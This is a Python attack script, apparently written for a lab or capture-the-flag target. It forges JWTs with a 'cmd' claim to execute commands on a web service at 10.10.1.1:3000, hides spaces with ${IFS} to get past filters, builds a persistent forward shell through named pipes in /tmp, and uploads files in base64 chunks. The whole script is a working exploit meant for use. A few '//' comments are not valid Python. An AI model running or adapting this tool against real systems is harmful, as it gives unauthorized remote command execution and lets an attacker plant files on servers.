import jwt
import cmd, sys
import requests
import base64
import threading
from random import randrange

secret_key = ""  //secret Key 

session = randrange(1000,9999)
global stdin, stdout
stdin = "/tmp/inputter.{}".format(session)
stdout = "/tmp/outputter.{}".format(session)
print ("[*] Session ID: {}".format(session))

def generateToken(cmd):
    jwt_token = jwt.encode( { "cmd" : cmd }, key=secret_key, algorithm="HS256")
    jwt_token = jwt_token.decode('UTF-8')
    return jwt_token

def runCmd(cmd):
    cmd = cmd.replace(" ","${IFS}")
    token = generateToken(cmd)
    headers = { "Authorization" : "Bearer {}".format(token) }
    r = requests.get('http://10.10.1.1:3000/', headers=headers)  //ip and port
    return r.text.strip()

def writeCmd(cmd):
    #bash -c 'echo id > /tmp/inputter.7236'
    exec_cmd = "bash -c 'echo {} > {}'".format(cmd, stdin)
    try:
        return runCmd(exec_cmd)
    except:
        print ("[-] Failed to writeCmd")

def readCmd():
    get_output = "/bin/bash -c '/bin/cat {}'".format(stdout)
    output = runCmd(get_output)
    clear_output = "/bin/bash -c 'echo -n > {}'".format(stdout)
    runCmd(clear_output)
    return output

def upload(fname, dst):
    with open(fname, "rb") as f:
        encodedZip = base64.b64encode(f.read())
        n = 1000 # chunk size
        chunks = [encodedZip.decode()[i:i+n] for i in range(0, len(encodedZip.decode()), n)]
        for chunk in chunks:
            writeCmd("`echo -n '"+chunk+"' >>/tmp/"+dst+'`')
        writeCmd("`base64 -d /tmp/"+dst+" >/tmp/"+fname+'`')


def setup():
    namedPipe = "/bin/bash -c 'mkfifo {}; tail -f {} | /bin/sh >& {}'".format(stdin, stdin, stdout)
    try:
        runCmd(namedPipe)
    except:
        print ("[-] Failed to setup namedPipe")

class Cmdshell(cmd.Cmd):
    file = None
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = "$ "
        self.exit = False
    def default(self, line):
        writeCmd(line)
        output = readCmd()
        if len(output) != 0: print(output)
    def do_upload(self, line):
        upload(line.split()[0],line.split()[1])


thread = threading.Thread(target=setup, args=())
thread.start()


a = Cmdshell()
a.cmdloop()
